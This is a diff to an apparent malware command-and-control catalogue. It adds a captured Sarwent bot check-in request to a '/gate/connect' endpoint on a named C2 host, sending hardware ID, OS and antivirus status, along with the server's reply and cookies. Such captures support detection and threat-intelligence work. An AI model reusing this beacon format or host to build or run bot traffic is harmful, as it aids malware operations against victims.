@@ -2637,7 +2637,28 @@ Keep-Alive: timeout=5, max=100
 Connection: Keep-Alive
 Content-Type: text/html; charset=UTF-8
 ~~~
+~~~
+GET /gate/connect?hwid=a98d6177939ada8b295d0a984de3a565&os=Windows+7+Release+Preview+(Build%3A+7601+-+Service+Pack%3A+1.0)+&bits=x64&av=Not+found HTTP/1.1
+Host: blognews-journal.com
+Connection: keep-alive
+User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14
+Accept: */*
+
+HTTP/1.1 200 OK
+Date: Sat, 15 Feb 2020 21:00:09 GMT
+Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
+X-Powered-By: PHP/7.1.33
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6IlAraGlSVVhaK0V2aVAyMlpSWXQ1RlE9PSIsInZhbHVlIjoibkp0RUx5K05RMSt3TmFBK0FpMmp0dDlCQ2FtWjVsSWgrcitMNkhJanBqSmpxYUJ2VUxYSUdzWFI0Y0F0aUk4ViIsIm1hYyI6IjNjNDdkMDIxMjBlNDJkYjU1MGY5N2VlZDc0NmFjNDdiZWMxMDJhMGM1ZTg2M2IyNDE3ODQ4MWFkYTI5NDdhOTAifQ%3D%3D; expires=Sat, 15-Feb-2020 23:00:09 GMT; Max-Age=7200; path=/
+Set-Cookie: laravel_session=eyJpdiI6ImFSMEdGbllpQzVyd0hkbW1sclZwYlE9PSIsInZhbHVlIjoiTUpKMG42WVlZUDQ4Y3d0bmk3em9VdUxhb3ZzSFVyelBCaVRYaWxKaGhjbjJ2dzh5Y1wvZWs2a1dHVmNNK0t4YWwiLCJtYWMiOiJjOTA0ZjZmMjBiODU3MzMwZGQyMDg0ZjA3MTk5M2RlN2E1NGE3MWRmZjQyNDAzYjQ0NjNhYzJkYTM1ZDAxOGY2In0%3D; expires=Sat, 15-Feb-2020 23:00:09 GMT; Max-Age=7200; path=/; httponly
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+~~~
+
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent.png "Sarwent BOT")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent2.png "Sarwent BOT")
 
 #### SDBot
 ~~~
